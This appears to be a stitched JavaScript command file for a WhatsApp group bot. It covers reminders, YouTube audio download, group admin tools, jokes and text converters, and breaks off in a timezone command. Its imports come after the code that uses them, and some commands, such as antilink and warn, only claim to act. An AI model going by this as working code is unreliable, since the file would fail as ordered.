      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use y2mate API to extract audio
    const response = await axios.get(`https://www.y2mate.com/mates/en60/analyze/ajax`, {
      params: {
        url: url,
        q_auto: 0,
        ajax: 1
      }
    });
    
    const $ = cheerio.load(response.data);
    const dlLink = $('a#btn_mp3').attr('href');
    
    if (!dlLink) {
      return repondre("😵 FAILED TO EXTRACT AUDIO! Try again later.");
    }
    
    const audioUrl = `https://www.y2mate.com${dlLink}`;
    
    // Download the audio file
    const audioResponse = await axios.get(audioUrl, { responseType: 'arraybuffer' });
    
    // Save the audio file
    const audioPath = path.join(__dirname, 'audio.mp3');
    fs.writeFileSync(audioPath, audioResponse.data);
    
    // Send the audio file
    await hn.sendMessage(dest, {
      audio: { url: audioPath },
      mimetype: 'audio/mpeg'
    }, { quoted: context.ms });
    
    // Clean up the audio file
    fs.unlinkSync(audioPath);
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    repondre(`😵 AUDIO DOWNLOAD FAILED! Error: ${error.message}\nAudio is resisting!`);
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
      ' ': '/'
    };
    
    // Convert to Morse code
    let morseCode = '';
    for (let i = 0; i < text.length; i++) {
      const char = text[i].toLowerCase();
      if (morseMap[char]) {
        morseCode += morseMap[char] + ' ';
      } else if (char === ' ') {
        morseCode += '/ ';
      }
    }
    
    await repondre(`📶 *Morse Code:*\n\n${morseCode}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre(`💀 CONVERSION FAILED! Error: ${error.message}\nText is resisting!`);
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

const { hango } = require("../framework/hango");
const conf = require(__dirname + "/../set");
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
